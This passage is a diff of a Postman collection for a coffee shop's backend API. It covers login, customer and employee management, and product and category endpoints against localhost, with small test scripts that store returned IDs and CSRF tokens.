@@ -1,16 +1,108 @@
 {
   "info": {
-    "_postman_id": "8f86f784-0a81-49b2-bd74-e3c35b8dd2c2",
+    "_postman_id": "e4e1f0a2-7b9a-4c1a-9c0a-morning-mist-v2",
     "name": "Morning Mist Coffee API",
-    "description": "Comprehensive Postman collection for all Morning Mist Coffee Backend APIs (Clean Architecture). Includes Auth, Chat, Orders, Products, Product Types, and Users management endpoints.",
+    "description": "Backend API collection generated from the current src/presentation/routes/* + requirements/*.md (clean architecture). Cookie-based auth (Postman's cookie jar handles access_token/refresh_token/csrf_token automatically for localhost requests within a run). Includes a Security Tests folder for CSRF, injection, brute-force, rate-limit, and privilege-escalation checks.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:3000/api/v1",
+      "type": "string"
+    },
+    {
+      "key": "csrfToken",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "userId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "employeeEmail",
+      "value": "admin@todaywegrind.com",
+      "type": "string"
+    },
+    {
+      "key": "employeePassword",
+      "value": "ChangeMe!23",
+      "type": "string"
+    },
+    {
+      "key": "customerEmail",
+      "value": "customer.test@example.com",
+      "type": "string"
+    },
+    {
+      "key": "customerPassword",
+      "value": "ChangeMe!23",
+      "type": "string"
+    },
+    {
+      "key": "customerRegistrationKey",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "employeeRegistrationKey",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "customerId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "employeeId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "productId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "productSlug",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "variantId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "categoryId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "propertyId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "reviewId",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "orderId",
+      "value": "",
+      "type": "string"
+    }
+  ],
   "item": [
     {
       "name": "Health",
       "item": [
         {
-          "name": "Get System Health",
+          "name": "Health Check",
           "request": {
             "method": "GET",
             "header": [],
@@ -22,7 +114,8 @@
               "path": [
                 "health"
               ]
-            }
+            },
+            "description": "No prefix, no auth. DB ping."
           },
           "response": []
         }
@@ -32,185 +125,1109 @@
       "name": "Auth",
       "item": [
         {
-          "name": "Register New User",
+          "name": "Employee Login",
           "request": {
             "method": "POST",
             "header": [
               {
-                "key": "x-user-registration-key",
-                "value": "{{registrationKey}}",
+                "key": "Content-Type",
+                "value": "application/json",
                 "type": "text"
               }
             ],
+            "url": {
+              "raw": "{{baseUrl}}/auth/employee-login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "auth",
+                "employee-login"
+              ]
+            },
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"firstName\": \"John\",\n  \"lastName\": \"Doe\",\n  \"email\": \"john.doe@example.com\",\n  \"password\": \"SecurePassword123!\"\n}",
+              "raw": "{\n  \"email\": \"{{employeeEmail}}\",\n  \"password\": \"{{employeePassword}}\"\n}",
               "options": {
                 "raw": {
                   "language": "json"
                 }
               }
             },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/register",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "auth",
-                "register"
-              ]
-            }
+            "description": "Only queries the employees table. Sets access_token/refresh_token/csrf_token httpOnly cookies (Postman cookie jar handles this automatically against localhost). Rate-limited (AUTH_LOGIN_RATE_MAX/WINDOW) with a 5-attempt lockout."
           },
-          "response": []
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"status is 200\", () => pm.response.code === 200);",
+                  "const json = pm.response.json();",
+                  "if (json.csrfToken) pm.collectionVariables.set(\"csrfToken\", json.csrfToken);",
+                  "if (json.user && json.user.id) pm.collectionVariables.set(\"userId\", json.user.id);"
+                ]
+              }
+            }
+          ]
         },
         {
-          "name": "User Login",
+          "name": "Customer Login",
           "request": {
             "method": "POST",
-            "header": [],
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/auth/customer-login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "auth",
+                "customer-login"
+              ]
+            },
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"email\": \"john.doe@example.com\",\n  \"password\": \"SecurePassword123!\"\n}",
+              "raw": "{\n  \"email\": \"{{customerEmail}}\",\n  \"password\": \"{{customerPassword}}\"\n}",
               "options": {
                 "raw": {
                   "language": "json"
                 }
               }
             },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/login",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "auth",
-                "login"
-              ]
-            }
+            "description": "Only queries the customers table. Wrong-table credentials always return 401 Invalid email or password, never a cross-table fallback."
           },
-          "response": []
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"status is 200\", () => pm.response.code === 200);",
+                  "const json = pm.response.json();",
+                  "if (json.csrfToken) pm.collectionVariables.set(\"csrfToken\", json.csrfToken);",
+                  "if (json.user && json.user.id) pm.collectionVariables.set(\"userId\", json.user.id);"
+                ]
+              }
+            }
+          ]
         },
         {
           "name": "Refresh Token",
           "request": {
             "method": "POST",
             "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"refreshToken\": \"\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
             "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/refresh",
+              "raw": "{{baseUrl}}/auth/refresh",
               "host": [
                 "{{baseUrl}}"
               ],
               "path": [
-                "api",
-                "v1",
                 "auth",
                 "refresh"
               ]
-            }
+            },
+            "description": "Reads refresh_token cookie only (no body). Rotates the refresh token (old jti revoked, single-use)."
           },
-          "response": []
-        },
-        {
-          "name": "Logout Session",
-          "request": {
-            "method": "POST",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"refreshToken\": \"\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"status is 200\", () => pm.response.code === 200);",
+                  "const json = pm.response.json();",
+                  "if (json.csrfToken) pm.collectionVariables.set(\"csrfToken\", json.csrfToken);",
+                  "if (json.user && json.user.id) pm.collectionVariables.set(\"userId\", json.user.id);"
+                ]
               }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/logout",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "auth",
-                "logout"
-              ]
             }
-          },
-          "response": []
+          ]
         },
         {
-          "name": "Get Current Profile (Me)",
+          "name": "Get Current User (Me)",
           "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
             "method": "GET",
             "header": [],
             "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/me",
+              "raw": "{{baseUrl}}/auth/me",
               "host": [
                 "{{baseUrl}}"
               ],
               "path": [
-                "api",
-                "v1",
                 "auth",
                 "me"
               ]
+            },
+            "description": "Reads access_token cookie only (no Authorization header support). Returns csrfToken again so FE can recover it after reload."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"status is 200\", () => pm.response.code === 200);",
+                  "const json = pm.response.json();",
+                  "if (json.csrfToken) pm.collectionVariables.set(\"csrfToken\", json.csrfToken);",
+                  "if (json.user && json.user.id) pm.collectionVariables.set(\"userId\", json.user.id);"
+                ]
+              }
             }
+          ]
+        },
+        {
+          "name": "Logout",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/auth/logout",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "auth",
+                "logout"
+              ]
+            },
+            "description": "Reads refresh_token cookie only, revokes it, clears cookies. Not CSRF-exempt-required since it's in CSRF_EXEMPT_ROUTES."
           },
           "response": []
         }
       ]
     },
     {
-      "name": "AI Chat",
+      "name": "Customers",
       "item": [
         {
-          "name": "Send Chat Message",
+          "name": "Register Customer (self-service, public)",
           "request": {
             "method": "POST",
-            "header": [],
+            "header": [
+              {
+                "key": "X-Customer-Registration-Key",
+                "value": "{{customerRegistrationKey}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers"
+              ]
+            },
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": \"Xin chào! Bạn có thể giới thiệu cho tôi một loại cà phê đặc biệt tại cửa hàng không?\"\n    }\n  ]\n}",
+              "raw": "{\n  \"firstName\": \"Lan\",\n  \"lastName\": \"Nguyen\",\n  \"email\": \"{{customerEmail}}\",\n  \"phone\": \"0901234567\",\n  \"address\": \"123 Le Loi, Q1, HCMC\",\n  \"password\": \"{{customerPassword}}\"\n}",
               "options": {
                 "raw": {
                   "language": "json"
                 }
               }
             },
+            "description": "Public (no onRequest auth hook, rate-limited like login). Same endpoint whether a shopper self-registers or admin/staff creates on their behalf. Requires x-customer-registration-key header."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  const json = pm.response.json();",
+                  "  pm.collectionVariables.set(\"customerId\", json.id);",
+                  "}"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Get My Profile",
+          "request": {
+            "method": "GET",
+            "header": [],
             "url": {
-              "raw": "{{baseUrl}}/api/v1/chat",
+              "raw": "{{baseUrl}}/customers/me",
               "host": [
                 "{{baseUrl}}"
               ],
               "path": [
-                "api",
-                "v1",
-                "chat"
+                "customers",
+                "me"
+              ]
+            },
+            "description": "requireRole('customer')."
+          },
+          "response": []
+        },
+        {
+          "name": "Update My Profile",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers/me",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers",
+                "me"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"phone\": \"0909999999\",\n  \"address\": \"456 Nguyen Hue, Q1, HCMC\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "requireRole('customer'). Cannot touch status/loyaltyPoints (admin/staff only)."
+          },
+          "response": []
+        },
+        {
+          "name": "List Customers (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/customers?page=1&pageSize=20&q=",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                },
+                {
+                  "key": "q",
+                  "value": ""
+                }
+              ]
+            },
+            "description": "requireRole(['admin','staff'])."
+          },
+          "response": []
+        },
+        {
+          "name": "Update Customer (Admin/Staff)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers/{{customerId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers",
+                "{{customerId}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"status\": \"active\",\n  \"loyaltyPoints\": 50\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "requireRole(['admin','staff']). Can set status/loyaltyPoints, unlike the /me endpoint."
+          },
+          "response": []
+        },
+        {
+          "name": "Reset Customer Password (Admin/Staff)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers/{{customerId}}/password",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers",
+                "{{customerId}}",
+                "password"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"password\": \"NewPassw0rd!23\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "requireRole(['admin','staff']). No self-service password change exists for customers."
+          },
+          "response": []
+        },
+        {
+          "name": "Delete Customer (Admin/Staff)",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers/{{customerId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers",
+                "{{customerId}}"
+              ]
+            },
+            "description": "requireRole(['admin','staff'])."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Employees",
+      "item": [
+        {
+          "name": "List Employees",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/employees?page=1&pageSize=20",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                }
+              ]
+            },
+            "description": "Whole-file hook: requireRole(['admin','staff'])."
+          },
+          "response": []
+        },
+        {
+          "name": "Create Employee",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "X-Employee-Registration-Key",
+                "value": "{{employeeRegistrationKey}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/employees",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"firstName\": \"Minh\",\n  \"lastName\": \"Tran\",\n  \"companyEmail\": \"minh.tran@todaywegrind.com\",\n  \"department\": \"operations\",\n  \"password\": \"NewPassw0rd!23\",\n  \"role\": \"staff\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "admin/staff only, plus x-employee-registration-key header. A staff actor creating role: 'admin' is rejected (ForbiddenError)."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  const json = pm.response.json();",
+                  "  pm.collectionVariables.set(\"employeeId\", json.id);",
+                  "}"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Update Employee",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/employees/{{employeeId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees",
+                "{{employeeId}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"department\": \"sales\",\n  \"status\": \"active\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Only department/role/status are patchable (not name/email). A staff actor cannot set role: 'admin' or edit an admin target."
+          },
+          "response": []
+        },
+        {
+          "name": "Reset Employee Password",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/employees/{{employeeId}}/password",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees",
+                "{{employeeId}}",
+                "password"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"password\": \"AnotherPass1!\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Delete Employee",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/employees/{{employeeId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees",
+                "{{employeeId}}"
+              ]
+            },
+            "description": "A staff actor cannot delete a target whose role is admin."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Products",
+      "item": [
+        {
+          "name": "List Products (public)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/products?page=1&pageSize=20&q=arabica&priceMin=0&priceMax=500000",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                },
+                {
+                  "key": "q",
+                  "value": "arabica"
+                },
+                {
+                  "key": "priceMin",
+                  "value": "0"
+                },
+                {
+                  "key": "priceMax",
+                  "value": "500000"
+                }
+              ]
+            },
+            "description": "q matches name/description/any variant property value."
+          },
+          "response": []
+        },
+        {
+          "name": "Get Product By Slug (public)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/products/slug/{{productSlug}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "slug",
+                "{{productSlug}}"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Get Product By ID (public)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/products/{{productId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "{{productId}}"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Product (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Ca Phe Arabica Da Lat\",\n  \"description\": \"Rang vua, vi chua nhe, hau ngot.\",\n  \"imageUrl\": \"https://cdn.todaywegrind.com/products/arabica-dalat.jpg\",\n  \"categoryIds\": [],\n  \"variant\": {\n    \"sku\": \"ARB-DL-250\",\n    \"priceCents\": 125000,\n    \"currency\": \"VND\",\n    \"stock\": 100,\n    \"propertyValues\": []\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Requires exactly one initial variant object (not an array). Product with zero variants is unsellable."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  const json = pm.response.json();",
+                  "  pm.collectionVariables.set(\"productId\", json.id);",
+                  "  if (json.variants && json.variants[0]) pm.collectionVariables.set(\"variantId\", json.variants[0].id);",
+                  "}"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Update Product (Admin/Staff)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/{{productId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "{{productId}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"description\": \"Updated description\",\n  \"imageUrl\": \"https://cdn.todaywegrind.com/products/arabica-dalat-2.jpg\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Renaming does not regenerate slug. Changing slug is an explicit PATCH {slug}. name/description changes trigger embedding resync."
+          },
+          "response": []
+        },
+        {
+          "name": "Set Product Categories (Admin/Staff)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/{{productId}}/categories",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "{{productId}}",
+                "categories"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"categoryIds\": [\n    \"{{categoryId}}\"\n  ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Replace-all semantics; resyncs product embedding."
+          },
+          "response": []
+        },
+        {
+          "name": "Create Product Variant (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/{{productId}}/variants",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "{{productId}}",
+                "variants"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"sku\": \"ARB-DL-500\",\n  \"priceCents\": 230000,\n  \"currency\": \"VND\",\n  \"stock\": 50,\n  \"propertyValues\": []\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Update Product Variant (Admin/Staff)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/variants/{{variantId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "variants",
+                "{{variantId}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"priceCents\": 135000\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Set Variant Property Values (Admin/Staff)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/variants/{{variantId}}/properties",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "variants",
+                "{{variantId}}",
+                "properties"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"values\": [\n    {\n      \"propertyId\": \"{{propertyId}}\",\n      \"value\": \"Da Lat\"\n    }\n  ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Replace-all per variant; triggers product embedding resync."
+          },
+          "response": []
+        },
+        {
+          "name": "Get Variant Stock (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/products/variants/{{variantId}}/stock",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "variants",
+                "{{variantId}}",
+                "stock"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Increase Variant Stock (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/variants/{{variantId}}/stock/increase",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "variants",
+                "{{variantId}}",
+                "stock",
+                "increase"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"quantity\": 20\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Decrease Variant Stock (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/variants/{{variantId}}/stock/decrease",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "variants",
+                "{{variantId}}",
+                "stock",
+                "decrease"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"quantity\": 5\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Delete Product Variant (Admin/Staff)",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/variants/{{variantId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "variants",
+                "{{variantId}}"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Delete Product (Admin/Staff)",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/products/{{productId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "products",
+                "{{productId}}"
               ]
             }
           },
@@ -219,35 +1236,419 @@
       ]
     },
     {
-      "name": "Search",
+      "name": "Product Categories",
       "item": [
         {
-          "name": "Voice Search",
+          "name": "List Categories (Admin/Staff)",
           "request": {
-            "method": "POST",
+            "method": "GET",
             "header": [],
-            "body": {
-              "mode": "formdata",
-              "formdata": [
-                {
-                  "key": "audio",
-                  "type": "file",
-                  "src": [],
-                  "description": "Audio file, max 10MB / 60s. audio/webm, audio/wav, audio/wave, audio/x-wav, audio/mpeg, audio/mp3, or audio/ogg."
-                }
-              ]
-            },
             "url": {
-              "raw": "{{baseUrl}}/api/v1/search/voice",
+              "raw": "{{baseUrl}}/product-categories",
               "host": [
                 "{{baseUrl}}"
               ],
               "path": [
-                "api",
-                "v1",
-                "search",
-                "voice"
+                "product-categories"
               ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Category (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-categories",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-categories"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Ca Phe\",\n  \"parentId\": null\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "name unique case-insensitively. Flat list; caller builds tree client-side via parentId."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  pm.collectionVariables.set(\"categoryId\", pm.response.json().id);",
+                  "}"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Update Category (Admin/Staff)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-categories/{{categoryId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-categories",
